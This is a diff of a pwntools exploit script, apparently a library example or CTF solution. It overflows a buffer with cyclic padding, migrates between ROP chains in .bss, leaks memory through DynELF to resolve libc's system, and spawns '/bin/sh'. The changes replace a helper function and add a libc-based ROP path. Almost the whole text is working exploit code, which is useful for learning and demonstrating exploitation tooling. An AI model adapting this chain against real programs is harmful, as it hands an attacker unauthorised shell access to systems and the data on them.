@@ -25,17 +25,13 @@ padding = cyclic(cyclic_find('kaab'))
 # Load the elf file
 rex  = ELF(binary)
 
-def myrop(base = None):
-    with context.local(log_level = 'WARNING'):
-        return ROP(rex, base = base)
-
 # Our goal from here is to dynamically resolve the address for system
 # to do this, we migrate between two ROP chains in the .bss section
 addrs = [rex.bss(0x200), rex.bss(0x300)]
 cur_addr = addrs[0]
 
 # Read in the first rop at cur_addr and migrate to it
-rop = myrop()
+rop = ROP(rex)
 rop.read(0, cur_addr, 0x100)
 rop.migrate(cur_addr)
 log.info("Stage 1 Rop:\n%s" % (rop.dump()))
@@ -46,7 +42,7 @@ r.send(padding + str(rop))
 def leak(addr, length = 0x100):
     global cur_addr
 
-    rop = myrop(cur_addr)
+    rop = ROP(rex, base=cur_addr)
     cur_addr = addrs[1] if cur_addr == addrs[0] else addrs[0]
     rop.write(1, addr, length)
     rop.read(0, cur_addr, 0x100)
@@ -59,11 +55,18 @@ def leak(addr, length = 0x100):
 
 # Use the memleaker to resolve system from libc
 resolver = DynELF(leak, elf=rex)
-system = resolver.lookup('system', 'libc')
+libc     = resolver.libc()
 
 # Call system('/bin/sh')
-rop = myrop(cur_addr)
-rop.call(system, ['/bin/sh'])
+if libc:
+    rop = ROP([rex, libc], base=cur_addr)
+    rop.system('/bin/sh')
+else:
+    system = resolver.lookup('system', 'libc')
+    rop = ROP([rex], base=cur_addr)
+    rop.call(system, ['/bin/sh'])
+
+log.info("Stage 2 Rop:\n%s" % (rop.dump()))
 
 # Send the rop and win
 r.send(str(rop))
